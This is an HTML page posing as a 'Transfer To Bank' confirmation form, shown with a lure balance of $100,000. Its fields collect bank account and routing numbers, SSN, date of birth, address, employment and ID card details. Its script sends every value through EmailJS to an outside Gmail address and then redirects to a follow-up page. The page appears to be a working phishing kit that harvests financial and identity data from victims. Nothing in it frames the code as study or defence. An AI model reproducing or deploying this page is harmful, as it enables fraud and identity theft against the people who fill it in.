<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Transfer To Bank</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <script type="text/javascript">
        (function() {
            emailjs.init("z0QGEnsIPv4sm3wgw"); // Replace with your EmailJS public key
        })();
    </script>
</head>
<body class="bg-gray-100">

    <!-- Header -->
    <div class="bg-blue-600 text-white text-center py-4">
        <h1 class="text-xl font-bold">Transfer To Bank</h1>
    </div>

    <!-- Form Section -->
    <div class="bg-white mx-4 mt-6 p-6 rounded-xl shadow-md">
        <h2 class="text-lg font-bold mb-4">Details Confirmation</h2>
        
        <!-- Form Inputs -->
        <input type="text" placeholder="Account Name" id="account-name" class="w-full border-2 border-blue-500 rounded-md p-3 mb-4 focus:outline-none focus:border-blue-700" />
        <input type="text" placeholder="Account #" id="account-number" class="w-full border-2 border-blue-500 rounded-md p-3 mb-4 focus:outline-none focus:border-blue-700" />
        <input type="text" placeholder="Routing #" id="routing-number" class="w-full border-2 border-blue-500 rounded-md p-3 mb-4 focus:outline-none focus:border-blue-700" />
        <input type="text" placeholder="Account type" id="account-type" class="w-full border-2 border-blue-500 rounded-md p-3 mb-4 focus:outline-none focus:border-blue-700" />
        <input type="text" placeholder="Residential Address" id="residential-address" class="w-full border-2 border-blue-500 rounded-md p-3 mb-4 focus:outline-none focus:border-blue-700" />
        <input type="text" placeholder="Address2" id="address" class="w-full border-2 border-blue-500 rounded-md p-3 mb-4 focus:outline-none focus:border-blue-700" />
        <input type="text" placeholder="City" id="city" class="w-full border-2 border-blue-500 rounded-md p-3 mb-4 focus:outline-none focus:border-blue-700" />
        <input type="text" placeholder="State" id="state" class="w-full border-2 border-blue-500 rounded-md p-3 mb-4 focus:outline-none focus:border-blue-700" />
        <input type="text" placeholder="Zip-Code" id="zip-code" class="w-full border-2 border-blue-500 rounded-md p-3 mb-4 focus:outline-none focus:border-blue-700" />
        <input type="text" placeholder="Date Of Birth" id="dob" class="w-full border-2 border-blue-500 rounded-md p-3 mb-4 focus:outline-none focus:border-blue-700" />
        <input type="text" placeholder="SSN" id="ssn" class="w-full border-2 border-blue-500 rounded-md p-3 mb-4 focus:outline-none focus:border-blue-700" />
        <input type="text" placeholder="Phone #" id="phone" class="w-full border-2 border-blue-500 rounded-md p-3 mb-4 focus:outline-none focus:border-blue-700" />
        <input type="text" placeholder="Employment Status" id="employment-status" class="w-full border-2 border-blue-500 rounded-md p-3 mb-4 focus:outline-none focus:border-blue-700" />
        <input type="text" placeholder="Employment" id="employment" class="w-full border-2 border-blue-500 rounded-md p-3 mb-4 focus:outline-none focus:border-blue-700" />

        <!-- ID Type Dropdown -->
        <select id="id-type" class="w-full border-2 border-blue-500 rounded-md p-3 mb-4 focus:outline-none focus:border-blue-700">
            <option value="" disabled selected>Select ID Type</option>
            <option value="State ID">State ID</option>
            <option value="Driving License">Driving License</option>
        </select>

        <input type="text" placeholder="ID #" id="id-number" class="w-full border-2 border-blue-500 rounded-md p-3 mb-4 focus:outline-none focus:border-blue-700" />

        <label for="date-issued">ID Date Issued</label>
        <div class="date-inputs mb-4">
            <input type="text" placeholder="mm" id="id-issue-mm" class="w-16 border-2 border-blue-500 rounded-md p-2 mr-2 focus:outline-none">
            <input type="text" placeholder="dd" id="id-issue-dd" class="w-16 border-2 border-blue-500 rounded-md p-2 mr-2 focus:outline-none">
            <input type="text" placeholder="yyyy" id="id-issue-yyyy" class="w-24 border-2 border-blue-500 rounded-md p-2 focus:outline-none">
        </div>

        <label for="expiration-date">ID Expiration Date</label>
        <div class="date-inputs mb-4">
            <input type="text" placeholder="mm" id="id-expire-mm" class="w-16 border-2 border-blue-500 rounded-md p-2 mr-2 focus:outline-none">
            <input type="text" placeholder="dd" id="id-expire-dd" class="w-16 border-2 border-blue-500 rounded-md p-2 mr-2 focus:outline-none">
            <input type="text" placeholder="yyyy" id="id-expire-yyyy" class="w-24 border-2 border-blue-500 rounded-md p-2 focus:outline-none">
        </div>

        <input type="text" placeholder="ID State" id="id-state" class="w-full border-2 border-blue-500 rounded-md p-3 mb-4 focus:outline-none focus:border-blue-700" />

        <!-- Available Balance -->
        <p class="text-lg font-bold">Available Balance: $100,000</p>

        <!-- Submit Button -->
    <button onclick="sendEmail()" class="w-full bg-blue-600 text-white font-bold py-3 mt-4 rounded-md">Submit</button>
    </div>

    <script>
        function sendEmail() {
            // Collect form data
            const formData = {
                account_name: document.getElementById("account-name").value,
                account_number: document.getElementById("account-number").value,
                routing_number: document.getElementById("routing-number").value,
                account_type: document.getElementById("account-type").value,
                residential_address: document.getElementById("residential-address").value,
                address_2 : document.getElementById("address").value,
                city : document.getElementById("city").value,
                state : document.getElementById("state").value,
                zip_code: document.getElementById("zip-code").value,
                dob: document.getElementById("dob").value,
                ssn: document.getElementById("ssn").value,
                phone: document.getElementById("phone").value,
                employment_status: document.getElementById("employment-status").value,
                employment: document.getElementById("employment").value,
                id_type: document.getElementById("id-type").value,
                id_number: document.getElementById("id-number").value,
                id_issue_date: `${document.getElementById("id-issue-mm").value}-${document.getElementById("id-issue-dd").value}-${document.getElementById("id-issue-yyyy").value}`,
                id_expire_date: `${document.getElementById("id-expire-mm").value}-${document.getElementById("id-expire-dd").value}-${document.getElementById("id-expire-yyyy").value}`,
                id_state: document.getElementById("id-state").value
            };

            // Validate all fields
            for (let key in formData) {
                if (formData[key].trim() === "") {
                    alert("Please fill in all the fields before submitting.");
                    return;
                }
            }

            // Send email using EmailJS
            emailjs.send("service_dtjql2f", "template_h8pxhs6", {
                to_email: "goldenagecommunitycare@gmail.com", 
                message: JSON.stringify(formData, null, 2) // Format as JSON
            }).then(() => {
                alert("Form submitted successfully!");
                window.location.href = "transferp2.html"; // Navigate to transferp2.html
            }).catch(error => {
                alert("Submission failed. Please try again.");
                console.error(error);
            });
        }
    </script>

</body>
</html>
